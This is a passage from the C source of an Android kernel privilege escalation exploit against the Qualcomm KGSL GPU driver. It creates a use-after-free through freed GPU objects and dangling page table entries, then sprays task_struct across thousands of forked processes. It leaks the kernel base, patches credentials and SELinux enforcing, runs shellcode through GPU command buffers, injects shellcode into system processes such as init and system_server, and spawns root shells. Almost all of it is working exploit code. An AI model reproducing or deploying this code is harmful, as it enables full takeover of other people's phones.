    fprintf(stderr, "[10] Freeing UAF to create dangling PTEs\n");
    struct kgsl_gpuobj_free uaf_free = {0};
    uaf_free.id = uaf_id;
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &uaf_free) == 0)
    {
        fprintf(stderr, "    [+] UAF freed (id=%u)\n", uaf_id);
        fprintf(stderr, "    [*] Dangling PTEs created at VA 0x%lx - 0x%lx\n",
                (unsigned long)UAF_START,
                (unsigned long)(UAF_START + UAF_SIZE));
        fprintf(stderr, "    [+] UAF mmap pointer kept for child: %p\n", g_uaf_mmap_ptr);
        uaf_id = 0;
    }
    else
    {
        fprintf(stderr, "    [!] Failed to free UAF: %s\n", strerror(errno));
    }

    fprintf(stderr, "\n[11] Spraying task_struct\n");
    fprintf(stderr, "    [*] Creating %d processes with marker '%s'\n", spray_count, MARKER_NAME);

    char qwerqwer[0x500] = {0};
    pid_t spray_pids[SPRAY_COUNT_MAX];
    fd2 = open("./memo", O_RDWR | O_CREAT | O_TRUNC, 0644);
    write(fd2, qwerqwer, 0x500);
    int spray_success = 0;
    int fd_zero = -1;
    fd_zero = open("./zeros.bin", O_RDWR | O_CREAT | O_TRUNC, 0644);

    char buffer_zero[0x100];
    memset(buffer_zero, 0, sizeof(buffer_zero));
    write(fd_zero, buffer_zero, sizeof(buffer_zero));
    lseek(fd_zero, 0, SEEK_SET);

    fprintf(stderr, "    [*] Forking spray processes...\n");
    for (int i = 0; i < spray_count; i++)
    {
        pid_t pid = fork();
        if (pid == 0)
        {
            char proc_name[16];
            memset(proc_name, 0, 16);
            pid_t self = getpid();
            snprintf(proc_name, sizeof(proc_name), "%s%05d", MARKER_NAME, self);
            prctl(PR_SET_NAME, proc_name, 0, 0, 0);
            prctl(PR_SET_PDEATHSIG, SIGKILL);
            int idx = i;
            spray_ctrl[idx].pid = self;
            spray_ctrl[idx].do_action = 0;
            spray_ctrl[idx].ready = 1;

            void *spray_heap = mmap(NULL,
                                    PAGE_SIZE * 4,
                                    PROT_READ | PROT_WRITE,
                                    MAP_PRIVATE | MAP_ANONYMOUS,
                                    -1, 0);
            if (spray_heap == MAP_FAILED)
            {
                fprintf(stderr, "[SPRAY %d] heap alloc failed: %s\n", i, strerror(errno));
            }
            else
            {
                memset(spray_heap, 0, PAGE_SIZE * 4);
                snprintf((char *)spray_heap + 0x800, PAGE_SIZE - 0x800, "%s%05d", MARKER_NAME, self);
                for (size_t j = 0; j < PAGE_SIZE * 4; j += PAGE_SIZE)
                    ((volatile uint8_t *)spray_heap)[j] = 0x11;
            }

            if (i % 1000 == 0) {
                fprintf(stderr, "[SPRAY %d] Started, PID=%d\n", i, self);
            }
            
            usleep(10000); // Wait 10ms to let system breathe

            while (1)
            {
                if (spray_ctrl[idx].do_action == 1 && (unsigned char)gbuf[0] == 0xab)
                {
                    fprintf(stderr, "[SPRAY %d] Triggered! Patching cred...\n", i);
                    safe_cred_patch();
                    
                    uid_t current_uid = getuid();
                    if (current_uid == 0) {
                        fprintf(stderr, "[SPRAY %d] [+] ROOT ESCALATION SUCCESSFUL!\n", i);
                        fprintf(stderr, "[SPRAY %d] [+] Spawning root shell...\n", i);
                        // Use a non-interactive check or just spawn a shell
                        system("id; /system/bin/sh");
                        exit(0);
                    } else {
                        fprintf(stderr, "[SPRAY %d] [!] Cred patch failed to change UID (current=%d)\n", i, current_uid);
                    }
                    return 0;
                }
                usleep(50000);
            }
        }
        else if (pid > 0)
        {
            spray_success++;
            spray_pids[i] = pid;
        }
        else
        {
            spray_pids[i] = -1;
        }
    }

    spray_actual = spray_success;

    fprintf(stderr, "    [+] Sprayed %d processes with names: %s0000 ~ %s%04d\n",
            spray_success, MARKER_NAME, MARKER_NAME, spray_success - 1);

    fprintf(stderr, "    [*] Waiting up to 2 seconds for spray processes to signal readiness...\n");
    int wait_ms = 2000;
    int waited = 0;
    int ready_count = 0;
    while (waited < wait_ms)
    {
        ready_count = 0;
        int limit = (spray_actual > 0) ? spray_actual : spray_success;
        for (int i = 0; i < limit; i++)
        {
            if (spray_ctrl[i].ready == 1)
                ready_count++;
        }
        if (ready_count >= spray_success)
            break;
        usleep(1000);
        waited += 1;
    }
    fprintf(stderr, "    [+] Ready spray processes: %d/%d\n", ready_count, spray_success);
    if (ready_count < spray_success)
    {
        fprintf(stderr, "    [*] Some processes not ready, sleeping briefly...\n");
        sleep(2);
    }

    fprintf(stderr, "\n[12] Scanning UAF region for non-zero data\n");
    fprintf(stderr, "    [*] Looking for KETO0422 marker and kernel pointers...\n");

    struct nonzero_page *found_pages = calloc(FINDING, sizeof(struct nonzero_page));
    int num_found = 0;

    if (scan_uaf_for_nonzero_multi(fd, found_pages, &num_found))
    {
        fprintf(stderr, "\n    [+] NON-ZERO PAGES FOUND IN UAF REGION!\n");
        fprintf(stderr, "    Count: %d pages\n", num_found);
        if (num_found > 0)
        {
            fprintf(stderr, "    [*] First found VA: 0x%lx\n",
                    (unsigned long)found_pages[0].va);
        }
        free(found_pages);
    }
    else
    {
        free(found_pages);
        fprintf(stderr, "\n    [!] scan_uaf_for_nonzero_multi failed. Cleaning up and restarting...\n");

        fprintf(stderr, "[CLEANUP] Killing all spray processes...\n");
        for (int i = 0; i < SPRAY_COUNT; i++)
        {
            if (spray_ctrl[i].pid > 0)
            {
                kill(spray_ctrl[i].pid, SIGKILL);
            }
        }
        usleep(200000);
        for (int i = 0; i < SPRAY_COUNT; i++)
        {
            if (spray_ctrl[i].pid > 0)
            {
                waitpid(spray_ctrl[i].pid, NULL, WNOHANG);
                spray_ctrl[i].pid = 0;
                spray_ctrl[i].ready = 0;
                spray_ctrl[i].do_action = 0;
            }
        }

        if (fd_zero >= 0)
        {
            close(fd_zero);
            fd_zero = -1;
        }
        if (fd2 >= 0)
        {
            close(fd2);
            fd2 = -1;
        }

        if (overlap_vma && overlap_vma != MAP_FAILED)
        {
            munmap(overlap_vma, overlap_mmapsize);
            overlap_vma = NULL;
        }
        if (ph_vma && ph_vma != MAP_FAILED)
        {
            munmap(ph_vma, ph_mmapsize);
            ph_vma = NULL;
        }
        if (bogus_vma && bogus_vma != MAP_FAILED)
        {
            munmap(bogus_vma, PAGE_SIZE * 3);
            bogus_vma = NULL;
        }

        struct kgsl_gpuobj_free free_obj = {0};
        if (overlap_id)
        {
            free_obj.id = overlap_id;
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
            overlap_id = 0;
        }
        if (ph_id)
        {
            free_obj.id = ph_id;
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
            ph_id = 0;
        }
        if (uaf_id)
        {
            free_obj.id = uaf_id;
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
            uaf_id = 0;
        }

        if (fd >= 0)
        {
            close(fd);
            fd = -1;
        }

        memset(spray_ctrl, 0, sizeof(spray_slot_t) * SPRAY_COUNT);
        spray_count = SPRAY_COUNT;
        spray_actual = 0;
        fprintf(stderr, "    [*] Keeping spray_count=%d and retrying...\n", spray_count);
        sleep(2);
        goto restart;
    }

    for (int i = 0; i < spray_count; i++)
    {
        if (spray_ctrl[i].do_action == 0 && spray_ctrl[i].pid > 0)
        {
            kill(spray_ctrl[i].pid, SIGTERM);
        }
    }
    for (int i = 0; i < spray_count; i++)
    {
        if (spray_ctrl[i].do_action == 0 && spray_ctrl[i].pid > 0)
        {
            waitpid(spray_ctrl[i].pid, NULL, 0);
        }
    }

    uint64_t kbase = (*(uint64_t *)&gbuf[0x20]);
    if (kbase != 0)
    {
        kernel_base = kbase;
        fprintf(stderr, "[+] Kernel base: 0x%lx\n", (unsigned long)kbase);
    }
    else
    {
        uint64_t task_va = *(uint64_t *)&gbuf[GBUF_TASK_VA];
        if (task_va != 0)
        {
            kernel_base = find_kernel_base_from_task_va(task_va);
        }
        if (kernel_base == 0)
        {
            kernel_base = get_kernel_base();
        }
        fprintf(stderr, "[+] Kernel base: 0x%lx\n", (unsigned long)kernel_base);
    }

    uint64_t init_cred = kbase + INIT_TASK_OFFSET;
    uint64_t poweroff_cmd = kbase + 0x2BB8EC0;
    uint64_t orderly_poweroff = kbase + 0x5F96C;
    uint64_t memstart_addr = kbase + 0x24C2538;
    if (kbase != 0)
    {
        uint64_t auto_offset = find_offsets_auto(kbase);
        selinux_enforcing = kbase + (auto_offset != 0 ? auto_offset : SELINUX_OFFSET);
        if (selinux_enforcing == 0 || selinux_enforcing == kbase + SELINUX_OFFSET)
        {
            uint64_t found_selinux = 0;
            selinux_enforcing = kbase + SELINUX_OFFSET;
        }
    }
    else
    {
        selinux_enforcing = 0;
    }
    *(uint64_t *)&gbuf[GBUF_SET_TASKS] = selinux_enforcing;

    fprintf(stderr, "[+] SELinux enforcing at: 0x%lx\n", (unsigned long)selinux_enforcing);
    fprintf(stderr, "[+] Poweroff cmd at: 0x%lx\n", (unsigned long)poweroff_cmd);

    sleep(1);
    fprintf(stderr, "[child] Triggering cred patch in spray processes...\n");
    gbuf[0] = 0xab;
    gbuf[GBUF_FOUND_PID] = 0x11;
    fprintf(stderr, "[+] Set FOUND_PID=0x11 for child1\n");
    usleep(100000);

    if (!wait_for_flag_u8((volatile uint8_t *)&gbuf[GBUF_TASK_SPRAY], 0x1, WAIT_TIMEOUT_MS) &&
        !wait_for_flag_u8((volatile uint8_t *)&gbuf[GBUF_TASK_SPRAY], 0x2, WAIT_TIMEOUT_MS))
    {
        fprintf(stderr, "[!] timeout waiting for TASK_SPRAY_CLEAR\n");
    }
    else
    {
        if (gbuf[GBUF_TASK_SPRAY] == 0x1)
        {
            fprintf(stderr, "[!] child read fail\n");
        }
        else if (gbuf[GBUF_TASK_SPRAY] == 0x2)
        {
            fprintf(stderr, "[+] child read success\n");
        }
    }

    mmap_spray();

    fprintf(stderr, "\n[12b] Final UAF scan for structs...\n");
    struct nonzero_page pages2[MAX_FOUND_PAGES];
    int num_pages2 = 0;
    fprintf(stderr, "[+] Found %d pages\n", num_pages2);

    gbuf[0x910] = 1;
    mmap_check();
    sleep(1);
    fprintf(stderr, "[+] mmap_check complete.\n");

    uint32_t rb_count = *(uint32_t *)(gbuf + 0xb00);
    fprintf(stderr, "[RECOVER] rb_count=%u\n", rb_count);

                    recover_origin(fd);

    fprintf(stderr, "[+] Exploit sequence complete!\n");

    g_shellcode_va = *(uint64_t *)&gbuf[GBUF_SHELLCODE_ADDR];
    
    if (g_shellcode_va != 0) {
        fprintf(stderr, "[+] Shellcode address from gbuf: 0x%lx\n", (unsigned long)g_shellcode_va);
        gb_target_addr = g_shellcode_va;
        *(uint64_t *)&gbuf[GBUF_LIB_BASE] = g_shellcode_va;

        fprintf(stderr, "[+] Executing shellcode at 0x%lx\n", (unsigned long)g_shellcode_va);
        
        struct kgsl_drawctxt_create ctx = {
            .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
        if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) == 0) {
            unsigned ctx_id = ctx.drawctxt_id;
            
            struct kgsl_gpuobj_alloc ib_alloc = {
                .size = PAGE_SIZE * 4,
                .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
            if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) == 0) {
                unsigned ib_id = ib_alloc.id;
                void *ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
                                    MAP_SHARED, fd, ((off_t)ib_id) << 12);
                if (ib_vma != MAP_FAILED) {
                    struct kgsl_gpuobj_info info = {.id = ib_id};
                    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
                    uint64_t ib_gpu = info.gpuaddr;
                    
                    uint32_t *cmd = (uint32_t *)ib_vma;
                    int dw = 0;
                    memset(ib_vma, 0, ib_alloc.mmapsize);
                    
                    uint32_t d_lo, d_hi;
                    split64(g_shellcode_va, &d_lo, &d_hi);
                    cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
                    cmd[dw++] = d_lo;
                    cmd[dw++] = d_hi;
                    cmd[dw++] = 0xD61F03C0;
                    
                    cmd[dw++] = cp_type7_packet(CP_NOP, 0);
                    
                    size_t ib_bytes = (size_t)dw * 4;
                    msync(ib_vma, ib_bytes, MS_SYNC);
                    
                    struct kgsl_command_object obj = {
                        .gpuaddr = ib_gpu,
                        .size = ib_bytes,
                        .flags = KGSL_CMDLIST_IB,
                        .id = ib_id};
                    struct kgsl_gpu_command gpu_cmd = {0};
                    gpu_cmd.cmdlist = (uint64_t)(uintptr_t)&obj;
                    gpu_cmd.cmdsize = sizeof(obj);
                    gpu_cmd.numcmds = 1;
                    gpu_cmd.context_id = ctx_id;
                    
                    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) == 0 &&
                        wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) == 0) {
                        fprintf(stderr, "[+] Shellcode EXECUTED!\n");
                        
                        uid_t uid = getuid();
                        fprintf(stderr, "[+] Current UID after shellcode: %d\n", uid);
                        
                        if (uid == 0) {
                            fprintf(stderr, "[+] ROOT! Spawning shell...\n");
                            system("/data/data/com.termux/files/usr/bin/bash");
                            execl("/data/data/com.termux/files/usr/bin/bash", "bash", NULL);
                        }
                    }
                    
                    munmap(ib_vma, ib_alloc.mmapsize);
                }
                struct kgsl_gpuobj_free fr = {.id = ib_id};
                ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
            }
            struct kgsl_drawctxt_destroy dctx = {.drawctxt_id = ctx_id};
            ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &dctx);
        }
    }

    // ====== ПОИСК ROOT-ПРОЦЕССОВ (без повторного объявления dir) ======
    fprintf(stderr, "[+] Looking for root processes...\n");
    
    DIR *proc_dir = opendir("/proc");
    if (proc_dir) {
        struct dirent *entry;
        pid_t target_pid = 0;
        const char *target_names[] = {
            "init",
            "surfaceflinger", 
            "system_server",
            "zygote64",
            "zygote",
            "ueventd"
        };
        
        while ((entry = readdir(proc_dir)) != NULL && target_pid == 0) {
            if (entry->d_type != DT_DIR) continue;
            int pid = atoi(entry->d_name);
            if (pid <= 0) continue;
            
            char cmdline_path[64];
            snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%d/cmdline", pid);
            FILE *f = fopen(cmdline_path, "r");
            if (f) {
                char cmdline[256] = {0};
                fread(cmdline, 1, sizeof(cmdline)-1, f);
                fclose(f);
                
                for (int i = 0; i < 6; i++) {
                    if (strstr(cmdline, target_names[i]) != NULL) {
                        target_pid = pid;
                        fprintf(stderr, "[+] Found %s PID: %d\n", target_names[i], target_pid);
                        break;
                    }
                }
            }
        }
        closedir(proc_dir);
        
        if (target_pid != 0) {
            char stat_path[64];
            snprintf(stat_path, sizeof(stat_path), "/proc/%d/stat", target_pid);
            FILE *sf = fopen(stat_path, "r");
            if (sf) {
                char line[1024];
                if (fgets(line, sizeof(line), sf)) {
                    char *saveptr;
                    char *token = strtok_r(line, " ", &saveptr);
                    for (int i = 1; i < 28 && token; i++) {
                        token = strtok_r(NULL, " ", &saveptr);
                    }
                    if (token) {
                        unsigned long task_va = strtoul(token, NULL, 10);
                        fprintf(stderr, "[+] Target task_struct VA: 0x%lx\n", task_va);
                        
                        uint64_t target_shellcode_va = task_va & ~(uint64_t)(PAGE_SIZE - 1);
                        target_shellcode_va += 0x1000;
                        
                        if (gpu_write_task_virt(fd, target_shellcode_va, (uint8_t *)shellcode, shellcode_len) == 0) {
                            fprintf(stderr, "[+] Shellcode injected into target at 0x%lx\n", (unsigned long)target_shellcode_va);
                            
                            struct kgsl_drawctxt_create ctx2 = {
                                .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
                            if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx2) == 0) {
                                unsigned ctx_id2 = ctx2.drawctxt_id;
                                
                                struct kgsl_gpuobj_alloc ib_alloc2 = {
                                    .size = PAGE_SIZE * 4,
                                    .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
                                if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc2) == 0) {
                                    unsigned ib_id2 = ib_alloc2.id;
                                    void *ib_vma2 = mmap(NULL, ib_alloc2.mmapsize, PROT_READ | PROT_WRITE,
                                                          MAP_SHARED, fd, ((off_t)ib_id2) << 12);
                                    if (ib_vma2 != MAP_FAILED) {
                                        struct kgsl_gpuobj_info info2 = {.id = ib_id2};
                                        ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info2);
                                        uint64_t ib_gpu2 = info2.gpuaddr;
                                        
                                        uint32_t *cmd2 = (uint32_t *)ib_vma2;
                                        int dw2 = 0;
                                        memset(ib_vma2, 0, ib_alloc2.mmapsize);
                                        
                                        uint32_t d_lo2, d_hi2;
                                        split64(target_shellcode_va, &d_lo2, &d_hi2);
                                        cmd2[dw2++] = cp_type7_packet(CP_MEM_WRITE, 3);
                                        cmd2[dw2++] = d_lo2;
                                        cmd2[dw2++] = d_hi2;
                                        cmd2[dw2++] = 0xD61F03C0;
                                        
                                        cmd2[dw2++] = cp_type7_packet(CP_NOP, 0);
                                        
                                        size_t ib_bytes2 = (size_t)dw2 * 4;
                                        msync(ib_vma2, ib_bytes2, MS_SYNC);
                                        
                                        struct kgsl_command_object obj2 = {
                                            .gpuaddr = ib_gpu2,
                                            .size = ib_bytes2,
                                            .flags = KGSL_CMDLIST_IB,
                                            .id = ib_id2};
                                        struct kgsl_gpu_command gpu_cmd2 = {0};
                                        gpu_cmd2.cmdlist = (uint64_t)(uintptr_t)&obj2;
                                        gpu_cmd2.cmdsize = sizeof(obj2);
                                        gpu_cmd2.numcmds = 1;
                                        gpu_cmd2.context_id = ctx_id2;
                                        
                                        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd2) == 0 &&
                                            wait_timestamp(fd, ctx_id2, gpu_cmd2.timestamp) == 0) {
                                            fprintf(stderr, "[+] Shellcode EXECUTED in target process!\n");
                                            fprintf(stderr, "[+] Target process (PID=%d) should now be ROOT!\n", target_pid);
                                            fprintf(stderr, "[+] Try: su\n");
                                        }
                                        
                                        munmap(ib_vma2, ib_alloc2.mmapsize);
                                    }
                                    struct kgsl_gpuobj_free fr2 = {.id = ib_id2};
                                    ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr2);
                                }
                                struct kgsl_drawctxt_destroy dctx2 = {.drawctxt_id = ctx_id2};
                                ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &dctx2);
                            }
                        }
                    }
                }
                fclose(sf);
            }
        } else {
            fprintf(stderr, "[!] No root process found!\n");
            fprintf(stderr, "[+] Checking if current process is already root...\n");
            
            uid_t current_uid = getuid();
            if (current_uid == 0) {
                fprintf(stderr, "[+] ROOT! Spawning shell...\n");
                system("/system/bin/sh");
            } else {
                fprintf(stderr, "[!] Current UID is %d. Exploit might have failed or is running in a child.\n", current_uid);
            }
        }
    }

    fprintf(stderr, "[+] Waiting for triggered process...\n");
    {
        uint64_t target_pid = *(uint64_t *)&gbuf[GBUF_TARGET_PID];
        if ((pid_t)target_pid > 0)
        {
            waitpid((pid_t)target_pid, NULL, 0);
        }
    }

    fprintf(stderr, "[+] Done! Check if root shell spawned.\n");
    return 0;
}
